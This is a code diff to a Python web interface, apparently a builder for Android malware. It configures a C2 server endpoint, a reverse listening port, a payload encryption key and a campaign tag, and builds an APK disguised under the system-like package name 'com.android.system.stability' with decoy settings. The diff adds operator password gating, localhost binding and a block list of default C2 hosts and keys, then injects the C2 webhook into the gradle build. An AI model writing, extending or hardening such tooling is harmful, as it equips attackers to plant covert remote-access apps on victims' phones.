@@ -8,8 +8,19 @@ import subprocess
 import webbrowser
 import threading
 import urllib.parse
+import secrets
 
 import socket
+
+# --- BUILD_PASSWORD: env override, otherwise random per launch and printed once ---
+BUILD_PASSWORD = os.environ.get("BUILD_PASSWORD") or secrets.token_hex(12)
+# In-memory session tokens issued by /auth (browser holds tokens, never the password)
+SESSION_TOKENS = set()
+TOKEN_TTL_SECONDS = 60 * 60  # 60 minutes
+# Values that are never acceptable for C2 host or encryption key
+BLOCKED_VALUES = {"", "AndroidKernel1337", "TacticalKey2026SecureGCM", "admin1337",
+                  "https://lab-rats-v1-6.onrender.com", "http://lab-rats-v1-6.onrender.com",
+                  "lab-rats-v1-6.onrender.com"}
 
 def find_free_port(default_port=8000):
     for p in [default_port, 8080, 8888, 9090, 3000]:
@@ -95,9 +106,9 @@ HTML_PAGE = """<!DOCTYPE html>
                     <div class="card-box">
                         <div class="card-box-title">C2 Server & Encryption Settings</div>
                         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 10px;">
-                            <div class="field-group"><label>C2 Server Endpoint / Webhook URL</label><input type="text" id="cfg-host" value="https://lab-rats-v1-6.onrender.com"></div>
+                            <div class="field-group"><label>C2 Server Endpoint / Webhook URL (REQUIRED)</label><input type="text" id="cfg-host" value="" placeholder="https://your-c2.example.com"></div>
                             <div class="field-group"><label>C2 Reverse Listening Port</label><input type="text" id="cfg-port" value="9191"></div>
-                            <div class="field-group"><label>AES-256 Payload Encryption Key</label><input type="text" id="cfg-key" value="TacticalKey2026SecureGCM"></div>
+                            <div class="field-group"><label>AES-256 Payload Encryption Key</label><input type="text" id="cfg-key" value="" placeholder="blank = auto-generated"></div>
                             <div class="field-group"><label>Campaign ID / Target Tag</label><input type="text" id="cfg-campaign" value="OPERATION_NIGHTHAWK"></div>
                         </div>
                     </div>
@@ -173,6 +184,10 @@ HTML_PAGE = """<!DOCTYPE html>
                 <div id="tab-build" class="panel">
                     <div class="card-box" style="text-align: center; padding: 35px;">
                         <div class="card-box-title">Compilation & Packaging</div>
+                        <div style="display: flex; justify-content: center; align-items: center; gap: 10px; margin-bottom: 25px; flex-wrap: wrap;">
+                            <input type="password" id="build-pass" placeholder="BUILD_PASSWORD (printed in server console)" style="background:#000; border:1px solid var(--neon-cyan); color:#fff; padding:10px 14px; border-radius:8px; font-family:'JetBrains Mono', monospace; font-size:0.8rem; width:320px; max-width:80%; outline:none;">
+                            <button class="btn-action" style="padding:10px 22px; font-size:0.75rem; margin:0;" onclick="unlockBuilder()">UNLOCK</button>
+                        </div>
                         <button id="btn-build" class="btn-action" onclick="runBuildPipeline()" style="margin-bottom: 25px;">GENERATE TACTICAL APK</button>
                         <div id="progress-bar-wrap" style="width: 100%; height: 10px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 20px; display: none; overflow: hidden;">
                             <div id="progress-bar" style="width: 0%; height: 100%; background: var(--neon-cyan); box-shadow: 0 0 15px var(--neon-cyan); transition: width 0.3s;"></div>
@@ -195,12 +210,50 @@ HTML_PAGE = """<!DOCTYPE html>
             document.getElementById('tab-' + id).classList.add('active');
         }
 
+        let buildToken = null;
+        const BLOCKED = ['', 'AndroidKernel1337', 'TacticalKey2026SecureGCM', 'admin1337',
+            'https://lab-rats-v1-6.onrender.com', 'http://lab-rats-v1-6.onrender.com', 'lab-rats-v1-6.onrender.com'];
+
+        async function unlockBuilder() {
+            const pass = document.getElementById('build-pass').value;
+            const term = document.getElementById('term');
+            if (!pass) { term.innerHTML += '> AUTH_FAILED: Enter the BUILD_PASSWORD printed in the server console\\n'; return; }
+            const r = await fetch('/auth', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: pass })
+            });
+            const d = await r.json();
+            if (d.success && d.token) {
+                buildToken = d.token;
+                term.innerHTML += '> AUTH_OK: Builder unlocked for this session.\\n';
+            } else {
+                buildToken = null;
+                term.innerHTML += '> AUTH_FAILED: Wrong BUILD_PASSWORD.\\n';
+            }
+        }
+
         function runBuildPipeline() {
             const btn = document.getElementById('btn-build');
             const barWrap = document.getElementById('progress-bar-wrap');
             const bar = document.getElementById('progress-bar');
             const term = document.getElementById('term');
             const dlWrap = document.getElementById('dl-wrap');
+
+            if (!buildToken) {
+                term.innerHTML += '> BUILD_REJECTED: Enter BUILD_PASSWORD and press UNLOCK first.\\n';
+                return;
+            }
+
+            const c2Host = document.getElementById('cfg-host').value.trim();
+            if (!c2Host) {
+                term.innerHTML += '> BUILD_REJECTED: C2 Server Endpoint is REQUIRED (empty value is rejected).\\n';
+                return;
+            }
+            if (BLOCKED.includes(c2Host)) {
+                term.innerHTML += '> BUILD_REJECTED: C2 endpoint matches a blocked default value. Use your own host.\\n';
+                return;
+            }
 
             btn.disabled = true; btn.style.opacity = '0.5';
             barWrap.style.display = 'block'; dlWrap.style.display = 'none';
@@ -210,7 +263,8 @@ HTML_PAGE = """<!DOCTYPE html>
             const configData = {
                 appName: document.getElementById('cfg-app-name').value,
                 pkgName: 'com.android.system.stability',
-                c2Host: document.getElementById('cfg-host').value,
+                c2Host: c2Host,
+                encKey: document.getElementById('cfg-key').value.trim(),
                 c2Port: document.getElementById('cfg-port').value,
                 decoyName: document.getElementById('cfg-decoy-name').value,
                 decoyUrl: document.getElementById('cfg-decoy-url').value,
@@ -220,7 +274,7 @@ HTML_PAGE = """<!DOCTYPE html>
 
             fetch('/build', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 'Content-Type': 'application/json', 'x-build-token': buildToken },
                 body: JSON.stringify(configData)
             })
             .then(r => r.json())
@@ -230,7 +284,7 @@ HTML_PAGE = """<!DOCTYPE html>
                     term.innerHTML += '> Local Gradle Build Completed!\\n> Output: apk-builder/output/app-release-signed.apk\\n> STATUS: BUILD_SUCCESS\\n';
                     btn.disabled = false; btn.style.opacity = '1';
                     dlWrap.style.display = 'block';
-                    document.getElementById('dl-btn').href = d.downloadUrl;
+                    document.getElementById('dl-btn').href = d.downloadUrl + '?token=' + encodeURIComponent(buildToken);
                 } else {
                     term.innerHTML += '> BUILD_FAILED: ' + (d.error || 'Unknown error') + '\\n';
                     btn.disabled = false; btn.style.opacity = '1';
@@ -246,7 +300,23 @@ HTML_PAGE = """<!DOCTYPE html>
 </html>
 """
 
+def _authorized(handler):
+    token = handler.headers.get("x-build-token") or ""
+    if not token:
+        parsed = urllib.parse.urlparse(handler.path)
+        token = urllib.parse.parse_qs(parsed.query).get("token", [""])[0]
+    return bool(token) and token in SESSION_TOKENS
+
+
 class BuilderHandler(http.server.SimpleHTTPRequestHandler):
+    def _send_json(self, code, obj):
+        payload = json.dumps(obj).encode('utf-8')
+        self.send_response(code)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(payload)))
+        self.end_headers()
+        self.wfile.write(payload)
+
     def do_GET(self):
         if self.path == "/" or self.path.startswith("/builder"):
             self.send_response(200)
@@ -254,7 +324,10 @@ class BuilderHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(HTML_PAGE.encode('utf-8'))
         elif self.path.startswith("/output/"):
-            file_name = os.path.basename(self.path)
+            if not _authorized(self):
+                self.send_error(401, "UNAUTHORIZED: unlock with BUILD_PASSWORD first")
+                return
+            file_name = os.path.basename(urllib.parse.urlparse(self.path).path)
             file_path = os.path.join(OUTPUT_DIR, file_name)
             if not os.path.exists(file_path):
                 # Fallback to source APK
@@ -273,22 +346,74 @@ class BuilderHandler(http.server.SimpleHTTPRequestHandler):
             super().do_GET()
 
     def do_POST(self):
+        content_length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(content_length)
+
+        if self.path == "/auth":
+            try:
+                data = json.loads(body.decode('utf-8'))
+            except Exception:
+                data = {}
+            if data.get("password") == BUILD_PASSWORD:
+                token = secrets.token_hex(16)
+                SESSION_TOKENS.add(token)
+                threading.Timer(TOKEN_TTL_SECONDS, lambda: SESSION_TOKENS.discard(token)).start()
+                self._send_json(200, {"success": True, "token": token})
+            else:
+                self._send_json(401, {"success": False})
+            return
+
         if self.path == "/build":
-            content_length = int(self.headers.get('Content-Length', 0))
-            body = self.rfile.read(content_length)
+            if not _authorized(self):
+                self._send_json(401, {"success": False, "error": "UNAUTHORIZED: unlock with BUILD_PASSWORD first"})
+                return
             try:
                 data = json.loads(body.decode('utf-8'))
                 app_name = data.get('appName', 'connection')
                 pkg_name = data.get('pkgName', 'com.android.system.stability')
+                c2_host = (data.get('c2Host') or '').strip()
+                enc_key = (data.get('encKey') or '').strip()
+
+                # C2 host is REQUIRED and must not match any known/default value
+                if c2_host in BLOCKED_VALUES:
+                    self._send_json(400, {"success": False,
+                                          "error": "C2 host is empty or matches a blocked default value. Enter your own C2 endpoint."})
+                    return
+
+                # Encryption key: empty -> auto-generate; blocked default -> reject
+                if enc_key in BLOCKED_VALUES:
+                    self._send_json(400, {"success": False,
+                                          "error": "Encryption key is empty or matches a blocked default value."})
+                    return
+                if not enc_key:
+                    enc_key = secrets.token_urlsafe(16)[:24]
 
                 # Update build_config.txt
                 config_path = os.path.join(SCRIPT_DIR, "build_config.txt")
-                config_content = f'PKG_NAME="{pkg_name}"\\nAPP_NAME="{app_name}"\\nVERSION_NAME="1.6.0"\\nMIN_SDK="21"\\nDECOY_CHOICE="1"\\n'
+                config_content = f'PKG_NAME="{pkg_name}"\nAPP_NAME="{app_name}"\nVERSION_NAME="1.6.0"\nMIN_SDK="21"\nDECOY_CHOICE="1"\n'
                 with open(config_path, "w") as f:
                     f.write(config_content)
 
-                # Execute local gradle build
-                gradle_cmd = f"cd {PROJECT_DIR} && ./gradlew assembleRelease --no-daemon"
+                # Update local.properties (WEBHOOK_URL / ENCRYPTION_KEY)
+                local_props_path = os.path.join(PROJECT_DIR, "local.properties")
+                lines = []
+                if os.path.exists(local_props_path):
+                    with open(local_props_path, "r") as f:
+                        lines = f.read().splitlines()
+                for key, value in (("WEBHOOK_URL", c2_host), ("ENCRYPTION_KEY", enc_key)):
+                    replaced = False
+                    for i, line in enumerate(lines):
+                        if line.startswith(key + "="):
+                            lines[i] = f"{key}={value}"
+                            replaced = True
+                    if not replaced:
+                        lines.append(f"{key}={value}")
+                with open(local_props_path, "w") as f:
+                    f.write("\n".join(lines) + "\n")
+
+                # Execute local gradle build (platform-aware wrapper)
+                gradle_wrapper = "gradlew.bat" if os.name == "nt" else "./gradlew"
+                gradle_cmd = f"cd {PROJECT_DIR} && {gradle_wrapper} assembleRelease --no-daemon"
                 proc = subprocess.run(gradle_cmd, shell=True, capture_output=True, text=True)
 
                 out_apk = os.path.join(OUTPUT_DIR, "app-release-signed.apk")
@@ -305,10 +430,7 @@ class BuilderHandler(http.server.SimpleHTTPRequestHandler):
             except Exception as e:
                 resp_data = {"success": False, "error": str(e)}
 
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.end_headers()
-            self.wfile.write(json.dumps(resp_data).encode('utf-8'))
+            self._send_json(200, resp_data)
 
 def launch_browser():
     url = f"http://localhost:{PORT}"
@@ -323,13 +445,16 @@ def launch_browser():
         webbrowser.open(url)
 
 def main():
-    print(f"\n [+] TACTICAL APK BUILDER GUI LAUNCHED")
-    print(f" [+] Local Web Interface: http://localhost:{PORT}")
+    print(f"\n [+] TACTICAL APK BUILDER GUI LAUNCHED (localhost only)")
+    print(f" [+] Local Web Interface: http://127.0.0.1:{PORT}")
+    print(f" [+] BUILD_PASSWORD: {BUILD_PASSWORD}")
+    if not os.environ.get("BUILD_PASSWORD"):
+        print(f" [+] (randomly generated for this launch; set env BUILD_PASSWORD to pin it)")
     print(f" [+] Opening default browser...\n")
 
     threading.Timer(0.8, launch_browser).start()
 
-    with socketserver.TCPServer(("", PORT), BuilderHandler) as httpd:
+    with socketserver.TCPServer(("127.0.0.1", PORT), BuilderHandler) as httpd:
         try:
             httpd.serve_forever()
         except KeyboardInterrupt:
